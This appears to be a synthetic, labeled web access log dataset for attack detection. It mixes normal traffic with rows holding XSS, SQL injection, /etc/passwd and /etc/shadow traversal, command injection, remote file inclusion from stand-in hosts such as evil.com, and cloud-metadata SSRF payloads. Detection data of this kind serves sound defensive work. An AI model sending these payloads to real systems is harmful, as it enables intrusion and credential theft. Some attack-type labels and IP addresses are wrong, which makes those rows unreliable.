logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-14T12:25:24+09:00,10.0.0.78,POST,/comment?msg=<script>alert('x')</script>,403,Metasploit/6.4,True,xss,2025-05-06T12:09:31+09:00,pentest_tool,-
2025-05-10T08:24:55+09:00,192.168.0.231,POST,/login?page=2,200,wget/1.8,False,normal,2025-05-01T23:19:42+09:00,script,https://example.com/prev
2025-05-12T15:09:00+09:00,10.0.0.2,BADTLS,/about,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",False,normal,2025-05-07T15:27:49+09:00,browser,https://example.com/prev
2025-05-14T09:52:54+09:00,10.0.0.22,GET,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,Nikto/2.1.6 (Evasions:none),True,xss,2025-05-06T10:32:02+09:00,pentest_tool,https://google.com/search?q=example
2025-05-02T13:24:36+09:00,192.168.0.66,POST,/css/style.css,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0,False,normal,2025-05-05T23:45:09+09:00,browser,https://www.facebook.com/
2025-05-03T07:14:47+09:00,192.168.0.251,POST,/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Edge/100.0,False,normal,2025-05-06T12:19:31+09:00,browser,https://twitter.com/
2025-05-08T01:11:01+09:00,82.110.211.93,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,502,curl/7.68.0,True,ssrf_rfi,2025-05-02T21:58:40+09:00,script,-
2025-05-03T13:43:10+09:00,10.0.0.49,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,sql_injection,2025-05-04T15:12:38+09:00,crawler,-
2025-05-11T17:25:04+09:00,162.177.226.164,GET,"/search?q=1' UNION SELECT username, password FROM users --",200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-04T00:34:29+09:00,pentest_tool,-
2025-05-08T21:22:25+09:00,10.0.0.225,POST,/images/....//....//etc/passwd,403,python-requests/2.30,True,directory_traversal,2025-05-01T17:50:48+09:00,script,-
2025-05-11T13:48:27+09:00,10.0.0.211,POST,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,BurpSuite Community/2025.4,True,xss,2025-05-06T23:13:08+09:00,pentest_tool,-
2025-05-06T02:07:10+09:00,153.191.230.24,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-07T00:57:57+09:00,browser,https://example.com/
2025-05-10T13:56:11+09:00,10.0.0.61,POST,/images/....//....//etc/passwd,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",True,directory_traversal,2025-05-02T10:47:59+09:00,browser,https://google.com/search?q=example
2025-05-14T08:55:45+09:00,192.168.0.27,POST,/login,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-05T20:48:23+09:00,browser,https://google.com/search?q=example
2025-05-07T16:13:03+09:00,192.168.0.66,GET,/js/app.js,302,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-07T09:38:01+09:00,mobile_browser,https://www.facebook.com/
2025-05-14T20:45:53+09:00,192.168.0.230,POST,/api/v1/user/35,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-04T13:14:27+09:00,crawler,https://twitter.com/
2025-05-02T01:03:45+09:00,40.68.119.85,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,200,Nikto/2.1.6 (Evasions:none),True,tls_probe,2025-05-04T23:17:11+09:00,pentest_tool,-
2025-05-03T17:21:06+09:00,10.0.0.54,GET,/search?q=<script>alert('x')</script>,200,wpscan/3.8.23,True,xss,2025-05-06T21:06:18+09:00,pentest_tool,-
2025-05-09T00:04:38+09:00,10.0.0.197,POST,/admin/backup%253Ffile%253Dconfig%253Becho%252Bx,200,wpscan/3.8.23,True,command_injection,2025-05-02T13:26:09+09:00,pentest_tool,-
2025-05-04T15:14:11+09:00,192.168.0.167,GET,/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-02T16:47:02+09:00,browser,https://google.com/search?q=example
2025-05-10T16:50:30+09:00,192.168.0.184,GET,/api/v1/user/35,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-01T16:32:46+09:00,browser,https://twitter.com/
2025-05-12T09:22:40+09:00,192.168.0.173,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0,False,normal,2025-05-06T13:45:04+09:00,browser,-
2025-05-09T08:24:58+09:00,192.168.0.176,POST,/api/v1/user/35,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T12:52:10+09:00,mobile_browser,https://google.com/search?q=example
2025-05-05T21:36:52+09:00,10.0.0.155,POST,/login.php?username=admin' OR '1'='1'--&password=pw,403,OWASP ZAP,True,sql_injection,2025-05-01T13:20:06+09:00,pentest_tool,-
2025-05-07T13:00:30+09:00,122.16.183.55,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-01T06:42:07+09:00,browser,https://example.com/
2025-05-14T07:58:13+09:00,10.0.0.71,POST,/ping%253Fhost%253D8.8.8.8%253Bcat%252B/etc/passwd,200,Nessus v10.5,True,command_injection,2025-05-05T22:29:40+09:00,pentest_tool,-
2025-05-13T13:16:38+09:00,192.168.0.208,POST,/api/v1/user/35,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T11:56:08+09:00,mobile_browser,-
2025-05-14T06:48:29+09:00,64.194.68.182,GET,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-06T02:46:40+09:00,browser,https://example.com/
2025-05-09T20:47:11+09:00,192.168.0.5,POST,/api/v1/user/35,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-02T12:19:11+09:00,mobile_browser,https://www.facebook.com/
2025-05-12T21:06:41+09:00,10.0.0.51,GET,/admin/backup?file=config;echo+x,200,Nessus v10.5,True,command_injection,2025-05-02T14:43:18+09:00,pentest_tool,-
2025-05-14T21:49:59+09:00,192.168.0.94,GET,/products,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-02T07:00:03+09:00,crawler,https://bing.com/search?q=foo
2025-05-09T01:00:41+09:00,192.168.0.172,POST,/signup,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-06T14:40:05+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-13T12:36:30+09:00,10.0.0.190,POST,/ping?host=8.8.8.8;cat+/etc/passwd,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",True,command_injection,2025-05-06T20:00:29+09:00,browser,-
2025-05-05T23:32:04+09:00,29.5.132.18,BADTLS,\x16\x03\x01\x00\81\x01\x00…,400,-,True,tls_probe,2025-05-01T16:52:33+09:00,pentest_tool,-
2025-05-05T01:48:43+09:00,192.168.0.151,POST,/signup,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-03T12:40:50+09:00,mobile_browser,https://www.facebook.com/
2025-05-03T01:20:23+09:00,192.168.0.153,GET,/api/v1/user/35,200,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-06T21:44:10+09:00,mobile_browser,-
2025-05-09T12:37:43+09:00,153.178.75.227,GET,/include?template=http://evil.com/shell.txt,502,python-requests/2.25.1,True,ssrf_rfi,2025-05-09T19:19:11+09:00,script,-
2025-05-11T03:35:03+09:00,109.6.166.54,GET,/index.php?page=../../../../etc/shadow%00,404,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-03T09:30:09+09:00,browser,-
2025-05-08T15:04:34+09:00,226.28.71.230,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-09T21:31:22+09:00,browser,https://example.com/
2025-05-03T17:34:31+09:00,10.0.0.72,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,True,xss,2025-05-04T09:16:23+09:00,browser,-
2025-05-05T01:34:02+09:00,192.168.0.94,GET,/home,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-02T15:55:25+09:00,crawler,-
2025-05-11T22:22:33+09:00,10.0.0.235,GET,/../../../../etc/passwd,404,python-requests/2.80,True,directory_traversal,2025-05-06T11:02:47+09:00,script,-
2025-05-02T09:32:20+09:00,10.0.0.234,POST,/comment?msg=<script>alert('x')</script>,200,python-requests/2.40,True,xss,2025-05-01T10:39:50+09:00,script,https://bing.com/search?q=foo
2025-05-07T12:07:54+09:00,10.0.0.253,GET,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,500,sqlmap/1.7#stable,True,ssrf_rfi,2025-05-03T16:58:17+09:00,pentest_tool,-
2025-05-03T15:45:37+09:00,10.0.0.7,GET,/proxy%253Furl%253Dhttp%253A//169.254.169.254/latest/meta-data/,500,BurpSuite Community/2025.4,True,ssrf_rfi,2025-05-06T12:01:01+09:00,pentest_tool,-
2025-05-02T09:28:22+09:00,192.168.0.142,POST,/signup,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-01T18:29:27+09:00,browser,https://bing.com/search?q=foo
2025-05-06T15:36:09+09:00,192.168.0.28,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Edge/106.0,False,normal,2025-05-05T17:39:10+09:00,browser,https://example.com/prev
2025-05-05T20:42:01+09:00,192.168.0.11,POST,/products?page=4,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-05T12:06:42+09:00,mobile_browser,https://www.facebook.com/
2025-05-13T00:06:47+09:00,10.0.0.68,POST,/images/....//....//etc/passwd,200,OWASP ZAP,True,directory_traversal,2025-05-03T07:03:26+09:00,pentest_tool,-
2025-05-01T09:18:27+09:00,172.16.0.215,POST,/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0,False,normal,2025-05-06T23:39:30+09:00,browser,https://google.com/search?q=example
2025-05-11T20:14:53+09:00,10.0.0.221,POST,/load?file=http://evil.com/shell.txt,404,wpscan/3.8.23,True,ssrf_rfi,2025-05-02T20:55:29+09:00,pentest_tool,-
2025-05-02T11:48:21+09:00,139.175.160.41,GET,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-07T04:19:46+09:00,browser,-
2025-05-09T22:28:00+09:00,192.168.0.117,POST,/css/style.css,404,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T23:06:57+09:00,mobile_browser,https://example.com/prev
2025-05-02T17:18:31+09:00,192.168.0.222,POST,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-06T18:38:33+09:00,browser,https://www.facebook.com/
2025-05-07T13:17:51+09:00,192.168.0.148,GET,/home?page=3,304,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-05T06:47:22+09:00,browser,https://example.com/prev
2025-05-07T21:29:24+09:00,115.230.99.53,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,BurpSuite Community/2025.4,True,tls_probe,2025-05-03T16:11:28+09:00,pentest_tool,-
2025-05-09T17:38:02+09:00,10.134.1.137,POST,/login?username=user979&password=pass5926,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",False,normal,2025-05-09T17:38:02+09:00,browser,-
2025-05-06T14:52:57+09:00,126.77.121.172,GET,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-04T07:57:20+09:00,browser,-
2025-05-03T00:25:58+09:00,72.144.227.116,GET,/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,xss,2025-05-09T14:19:19+09:00,browser,-
2025-05-09T17:42:09+09:00,104.143.206.90,GET,/static/js/app.js,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-12T08:58:36+09:00,browser,-
2025-05-05T13:57:27+09:00,10.0.0.89,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",True,sql_injection,2025-05-03T13:05:03+09:00,browser,-
2025-05-05T01:55:41+09:00,180.37.198.52,GET,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-03T21:34:38+09:00,browser,-
2025-05-13T12:48:32+09:00,10.0.0.132,POST,/../../../../etc/passwd,403,Metasploit/6.4,True,directory_traversal,2025-05-04T11:35:18+09:00,pentest_tool,-
2025-05-12T12:52:33+09:00,192.168.0.209,GET,/login,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-05T23:41:55+09:00,mobile_browser,https://www.facebook.com/
2025-05-03T01:45:41+09:00,10.0.0.162,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,403,wget/1.0,True,ssrf_rfi,2025-05-05T12:35:08+09:00,script,https://bing.com/search?q=foo
2025-05-04T12:15:04+09:00,10.0.0.95,POST,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,403,python-requests/2.15,True,command_injection,2025-05-06T13:49:52+09:00,script,-
2025-05-01T15:37:30+09:00,10.0.0.183,POST,/images/....//....//etc/passwd,500,curl/8.0,True,directory_traversal,2025-05-01T21:11:26+09:00,script,-
2025-05-12T16:00:35+09:00,126.209.246.95,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,500,python-requests/2.95,True,tls_probe,2025-05-07T20:35:34+09:00,script,-
2025-05-02T02:47:32+09:00,34.37.253.140,BADTLS,\x16\x03\x01\x00\e5\x01\x00…,400,-,True,tls_probe,2025-05-05T02:52:03+09:00,pentest_tool,-
2025-05-13T09:28:27+09:00,10.199.132.117,POST,/login?username=user120&password=pass2726,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",False,normal,2025-05-13T09:28:27+09:00,browser,https://search.example.com?q=shoes
2025-05-08T08:21:36+09:00,10.0.0.248,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,python-requests/2.40,True,xss,2025-05-06T11:24:33+09:00,script,-
2025-05-13T13:30:56+09:00,10.0.0.45,GET,/ping?host=8.8.8.8;cat+/etc/passwd,403,BurpSuite Community/2025.4,True,command_injection,2025-05-01T10:35:41+09:00,pentest_tool,-
2025-05-06T14:07:55+09:00,130.31.118.206,GET,/load?file=http://attacker.com/evil.php,504,Nikto/2.5.0,True,ssrf_rfi,2025-05-09T06:56:44+09:00,script,-
2025-05-01T20:29:08+09:00,192.168.0.55,POST,/api/v1/user/35?page=4,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,False,normal,2025-05-01T14:48:14+09:00,browser,https://www.facebook.com/
2025-05-13T09:44:26+09:00,10.0.0.112,GET,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,403,Nessus v10.5,True,command_injection,2025-05-06T17:36:24+09:00,pentest_tool,-
2025-05-09T07:32:51+09:00,10.0.0.118,GET,/search?q=<script>alert('x')</script>,200,Twitterbot/1.0,True,xss,2025-05-04T17:43:35+09:00,crawler,-
2025-05-09T09:30:12+09:00,192.168.0.144,GET,/api/v1/user/35,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-03T06:18:45+09:00,browser,https://www.facebook.com/
2025-05-10T22:48:28+09:00,192.168.0.25,GET,/about,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-01T17:06:21+09:00,browser,https://google.com/search?q=example
2025-05-14T13:47:51+09:00,192.168.0.199,GET,/products,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-02T11:36:45+09:00,crawler,-
2025-05-06T15:01:28+09:00,10.0.0.223,BADTLS,/search?q=shoes,200,Twitterbot/1.0,False,normal,2025-05-02T18:15:05+09:00,crawler,https://www.facebook.com/
2025-05-07T12:40:12+09:00,192.168.0.120,GET,/signup?page=2,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-04T19:22:04+09:00,mobile_browser,-
2025-05-11T17:20:35+09:00,10.0.0.135,GET,/proxy%253Furl%253Dhttp%253A//169.254.169.254/latest/meta-data/,403,python-requests/2.65,True,ssrf_rfi,2025-05-05T15:30:00+09:00,script,-
2025-05-06T15:45:42+09:00,10.0.0.8,GET,/images/....//....//etc/passwd,403,python-requests/2.50,True,directory_traversal,2025-05-04T09:48:11+09:00,script,-
2025-05-12T12:29:46+09:00,252.100.149.128,GET,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-02T10:47:33+09:00,browser,-
2025-05-09T04:46:00+09:00,17.133.128.183,GET,/comment?msg=<svg onload=alert(1)>,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,xss,2025-05-12T11:01:01+09:00,browser,-
2025-05-03T20:13:39+09:00,192.168.0.185,POST,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0,False,normal,2025-05-04T22:19:00+09:00,browser,-
2025-05-01T07:46:56+09:00,192.168.0.66,GET,/js/app.js,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-04T11:09:52+09:00,browser,https://example.com/prev
2025-05-10T22:07:55+09:00,10.0.0.65,GET,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,500,wpscan/3.8.23,True,command_injection,2025-05-07T21:58:16+09:00,pentest_tool,https://google.com/search?q=example
2025-05-03T20:49:33+09:00,125.45.164.53,GET,/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E,200,Mozilla/5.0 (X11; Linux x86_64),True,xss,2025-05-13T14:11:07+09:00,browser,-
2025-05-06T13:04:29+09:00,192.168.0.191,GET,/css/style.css,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,False,normal,2025-05-01T15:36:33+09:00,browser,-
2025-05-04T20:07:34+09:00,10.0.0.143,GET,/images/....//....//etc/passwd,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0,True,directory_traversal,2025-05-02T10:56:09+09:00,browser,https://google.com/search?q=example
2025-05-08T00:37:28+09:00,192.168.0.196,GET,/signup?page=4,200,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,normal,2025-05-01T19:15:32+09:00,crawler,-
2025-05-07T16:13:58+09:00,44.254.146.47,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,python-requests/2.80,True,tls_probe,2025-05-05T11:20:45+09:00,script,-
2025-05-02T20:15:29+09:00,192.168.0.51,POST,/css/style.css,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Edge/103.0,False,normal,2025-05-04T16:35:47+09:00,browser,-
2025-05-10T00:24:56+09:00,192.168.0.123,POST,/api/v1/user/35,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-01T18:57:56+09:00,crawler,-
2025-05-07T07:06:02+09:00,10.0.0.199,POST,/admin/backup%253Ffile%253Dconfig%253Becho%252Bx,200,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),True,command_injection,2025-05-04T21:57:31+09:00,crawler,-
2025-05-12T22:05:32+09:00,192.168.0.20,GET,/,200,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-05T16:41:24+09:00,mobile_browser,https://twitter.com/
2025-05-04T16:15:22+09:00,192.168.0.110,POST,/about,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-06T06:15:21+09:00,crawler,https://www.facebook.com/
2025-05-08T07:47:47+09:00,192.168.0.56,POST,/search?q=shoes,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",False,normal,2025-05-07T11:02:37+09:00,browser,-
2025-05-06T20:58:28+09:00,78.70.93.153,GET,/home,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-10T06:12:59+09:00,browser,https://example.com/
2025-05-10T20:58:23+09:00,192.168.0.111,POST,/signup,200,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,normal,2025-05-01T13:29:39+09:00,crawler,https://twitter.com/
2025-05-11T22:36:03+09:00,192.168.0.172,GET,/products,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T09:51:17+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-09T09:18:57+09:00,192.168.0.94,POST,/js/app.js,200,curl/7.6,False,normal,2025-05-03T13:42:10+09:00,script,https://google.com/search?q=example
2025-05-05T13:48:21+09:00,192.168.0.30,POST,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-04T16:58:27+09:00,browser,https://twitter.com/
2025-05-07T17:48:27+09:00,29.188.35.201,GET,/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,xss,2025-05-04T18:39:21+09:00,browser,-
2025-05-11T08:46:34+09:00,185.221.229.24,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-03T19:09:38+09:00,browser,-
2025-05-06T09:50:56+09:00,192.168.0.5,POST,/products,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",False,normal,2025-05-02T12:46:28+09:00,browser,https://bing.com/search?q=foo
2025-05-08T21:59:21+09:00,10.0.0.88,GET,/admin/backup?file=config;echo+x,403,sqlmap/1.7#stable,True,command_injection,2025-05-01T10:17:01+09:00,pentest_tool,-
2025-05-11T20:27:43+09:00,155.73.247.85,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,403,wpscan/3.8.23,True,tls_probe,2025-05-05T23:39:56+09:00,pentest_tool,-
2025-05-13T09:26:55+09:00,64.215.99.111,BADTLS,%5Cx16%5Cx03%5Cx01%5Cx00%5Cx82%5Cx01%5Cx00...,200,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),True,tls_probe,2025-05-06T22:53:20+09:00,crawler,-
2025-05-05T15:00:20+09:00,10.0.0.202,GET,/ping?host=8.8.8.8;cat+/etc/passwd,403,Metasploit/6.4,True,command_injection,2025-05-07T20:54:50+09:00,pentest_tool,-
2025-05-13T01:27:16+09:00,192.168.0.193,GET,/api/v1/user/35?page=4,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,False,normal,2025-05-01T11:18:42+09:00,browser,https://google.com/search?q=example
2025-05-07T13:47:29+09:00,192.168.0.51,POST,/search?q=shoes,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-03T11:17:55+09:00,browser,https://www.facebook.com/
2025-05-04T12:38:46+09:00,10.151.168.106,GET,/products?page=10,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",False,normal,2025-05-04T12:38:46+09:00,browser,https://example.com/
2025-05-13T07:44:57+09:00,10.0.0.231,POST,/load?file=http://evil.com/shell.txt,404,OWASP ZAP,True,ssrf_rfi,2025-05-06T08:31:31+09:00,pentest_tool,-
2025-05-11T00:22:58+09:00,10.0.0.88,GET,/product%3Fid%3D10%3BDROP%20TABLE%20users,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,True,sql_injection,2025-05-07T14:38:11+09:00,browser,-
2025-05-01T11:59:38+09:00,27.105.79.205,POST,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-14T02:23:30+09:00,browser,-
2025-05-02T16:57:30+09:00,192.168.0.230,GET,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,False,normal,2025-05-02T17:30:10+09:00,browser,-
2025-05-04T21:09:30+09:00,10.0.0.36,BADTLS,/login,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",False,normal,2025-05-01T08:05:44+09:00,browser,-
